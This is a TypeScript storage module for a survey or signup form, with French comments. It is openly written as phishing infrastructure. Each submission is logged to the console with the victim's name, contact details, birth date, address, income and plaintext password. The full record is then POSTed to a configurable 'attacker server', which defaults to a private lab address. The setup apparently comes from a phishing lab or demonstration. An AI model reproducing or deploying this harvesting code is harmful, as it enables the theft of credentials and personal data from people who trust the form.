import { type User, type InsertUser, type SurveyResponse, type InsertSurveyResponse } from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  createSurveyResponse(response: InsertSurveyResponse): Promise<SurveyResponse>;
  getAllSurveyResponses(): Promise<SurveyResponse[]>;
}

export class MemStorage implements IStorage {
  private users: Map<string, User>;
  private surveyResponses: Map<string, SurveyResponse>;

  constructor() {
    this.users = new Map();
    this.surveyResponses = new Map();
  }

  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }

  async createSurveyResponse(insertResponse: InsertSurveyResponse): Promise<SurveyResponse> {
    const id = randomUUID();
    const response: SurveyResponse = { 
      ...insertResponse, 
      id,
      submittedAt: new Date(),
    };
    this.surveyResponses.set(id, response);
    
    console.log("\n========================================");
    console.log("NOUVELLE REPONSE AU FORMULAIRE CAPTUREE");
    console.log("========================================");
    console.log(`Date: ${response.submittedAt?.toISOString()}`);
    console.log(`Nom: ${response.fullName}`);
    console.log(`Email: ${response.email}`);
    console.log(`Telephone: ${response.phone}`);
    console.log(`Date de naissance: ${response.birthDate}`);
    console.log(`Adresse: ${response.address}`);
    console.log(`Ville: ${response.city}`);
    console.log(`Code postal: ${response.postalCode}`);
    console.log(`Profession: ${response.profession}`);
    console.log(`Entreprise: ${response.company || "Non specifie"}`);
    console.log(`Revenus: ${response.income}`);
    console.log(`MOT DE PASSE: ${response.password}`);
    console.log(`Commentaires: ${response.comments || "Aucun"}`);
    console.log("========================================\n");
    
    // Envoyer les données au serveur attaquant
    this.sendToAttackerServer(insertResponse).catch(err => {
      console.error("Erreur lors de l'envoi au serveur attaquant:", err);
    });
    
    return response;
  }

  private async sendToAttackerServer(data: InsertSurveyResponse): Promise<void> {
    const attackerUrl = process.env.ATTACKER_SERVER_URL || "http://192.168.56.101:8080/api/survey";
    
    try {
      // Utiliser le module http natif de Node.js
      const http = await import("http");
      const url = new URL(attackerUrl);
      
      const postData = JSON.stringify(data);
      
      const options = {
        hostname: url.hostname,
        port: url.port || 8080,
        path: url.pathname,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(postData),
        },
      };

      const req = http.request(options, (res) => {
        if (res.statusCode === 200) {
          console.log("[+] Donnees du formulaire envoyees au serveur attaquant");
        } else {
          console.error(`[-] Erreur HTTP ${res.statusCode} lors de l'envoi au serveur attaquant`);
        }
      });

      req.on("error", (error) => {
        console.error("[-] Impossible de contacter le serveur attaquant:", error);
      });

      req.write(postData);
      req.end();
    } catch (error) {
      console.error("[-] Erreur lors de l'envoi au serveur attaquant:", error);
    }
  }

  async getAllSurveyResponses(): Promise<SurveyResponse[]> {
    return Array.from(this.surveyResponses.values());
  }
}

export const storage = new MemStorage();
